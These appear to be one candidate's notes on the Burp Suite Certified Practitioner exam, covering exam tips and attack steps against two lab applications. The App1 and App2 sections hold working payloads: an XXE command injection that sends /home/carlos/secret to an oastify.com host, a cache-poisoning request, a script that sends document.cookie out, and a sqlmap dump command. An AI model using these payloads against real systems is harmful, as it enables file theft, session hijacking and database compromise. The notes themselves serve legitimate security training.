
e5k4dj4y6bbbmhvhmane9b5c53buzkn9.oastify.com

If you find an SSRF vulnerability, you can use it to read the files by accessing an internal-only service running on locahost on port 6566.

Scanning selected pages and insertion points with Burp Suite Professional will often help you quickly progress through the exam. Attempting a full application scan will not be feasible in the exam time frame. Some vulnerabilities are are very challenging to detect using only manual testing. If you get stuck, we highly recommend using Burp Scanner to help you tackle the problem.

1. If you're attacking the victim user, test the attack out on your own browser first. Pay close attention to the HTTP traffic sequence in Burp.
2. If your solution is adapted from an Academy lab, try to analyze how the application differs from the lab.
3. Try to identify any assumptions you're making, and put them to the test.
4. Refer back to [the skill set the certification aims to prove](https://portswigger.net/web-security/certification#what-does-a-burp-suite-certification-mean-for-me).


- **Stage 1:** Access any user account.
    There is always an administrator account with the username "**administrator**", plus a lower-privileged account usually called "**carlos**". If you find a username enumeration vulnerability, you may be able to break into a low-privileged account using the following [username list](https://portswigger.net/web-security/authentication/auth-lab-usernames) and [password list](https://portswigger.net/web-security/authentication/auth-lab-passwords).
- **Stage 2:** Use the compromised user account to access the admin interface, perhaps by elevating your privileges or compromising the administrator account.
    
- **Stage 3:** Use the admin interface to read the contents of /home/carlos/secret from the server's filesystem, and submit it using 'submit solution'.


# App1

- was able to intercept post request to add X-host header, which was discovered by Param Miner. Added exploit server address with X-host header and stole token, which had come through to Access Log. 
- changing email has roleId, but has internal server error, most likely a SSRF or host header vulnerability
- used Intruder with Host: localhost:6566 from 0 to 100. 57 was available as roleId value. Changed using Repeater. 
- cookie: 6n3IamjWgZclXyRwHYv5goVkMYC3EqEK
- XXE with OS Command Injection - used this payload to get the solution in the Collaborator
```
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>
        <username>abc</username>
        <email>test@testing.com||`nslookup -q=cname $(cat /home/carlos/secret).e5k4dj4y6bbbmhvhmane9b5c53buzkn9.oastify.com`</email>
    </user>
</users>
```





# App2

- has cache control. Can poison resources.js
- e5k4dj4y6bbbmhvhmane9b5c53buzkn9.oastify.com
- deliver exploit to victim and view access log for agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36
- cache poisoned using this request:
  ```
  
GET / HTTP/1.1
Host: 0afe00000389b0308211d3c5008e002e.web-security-academy.net
X-Forwarded-Host: exploit-0a1700ec03c0b0a482dbd27901500080.exploit-server.net
X-Forwarded-Scheme: httpx
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: keep-alive

  ```

- exploit server - `document.write('<img src="http://e5k4dj4y6bbbmhvhmane9b5c53buzkn9.oastify.com?c='+document.cookie+'" />')`
- sqlmap to find administrator credentials:
  ```
python3 sqlmap.py -r BSCP --threads=10 --batch --cookie="fpCAWjwE5qrx87f92kqzWNSw2mOSkan3" -D public -T users --dump --level=3 --risk=2 -p term

  ```